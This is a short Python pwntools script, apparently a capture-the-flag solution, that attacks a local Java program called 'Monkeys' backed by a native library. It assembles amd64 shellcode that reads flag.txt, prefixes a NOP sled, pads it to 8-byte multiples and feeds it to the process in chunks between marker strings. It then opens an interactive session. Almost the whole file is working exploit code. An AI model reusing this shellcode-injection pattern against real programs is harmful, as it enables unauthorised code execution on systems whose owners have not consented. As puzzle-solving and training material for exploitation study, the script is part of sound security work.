from textwrap import wrap
import sys
from pwn import *
context.arch = 'amd64'

exe = '/usr/bin/java'

io = process([exe] + ["-Xshare:on", "-Djava.library.path=target/release", "Monkeys"])

shellcode = shellcraft.amd64.linux.cat("flag.txt")
print(asm(shellcode))

#buf = b'flagflag'
#buf = b'flagflag\n' + b'\xcc\xcc\xcc\xcc\xcc\xcc\xcc\xcc\n'*50 + b'ecrivez_'
buf = b"\x90"*16
buf += asm(shellcode)
print(len(buf) % 8)
buf += b"\x90" * (8 - (len(buf) % 8))
#buf = b'\n'.join(buf[i:i+8] for i in range(0, len(buf), 8)) + b'\n'
print(len(buf))
for i in range(1):
 io.sendline(b'flagflag')

 n = 8	# every 2 characters
 buf = [buf[i:i+n] for i in range(0, len(buf), n)]

 for line in buf:
    print(line)
    io.send(line)
#for i in range(100):
#   print(8 * b'\x90'.decode('latin-1'))
# io.send(buf)
 io.sendline(b'ecrivez_')
#io.sendline(b"stop")
io.interactive()
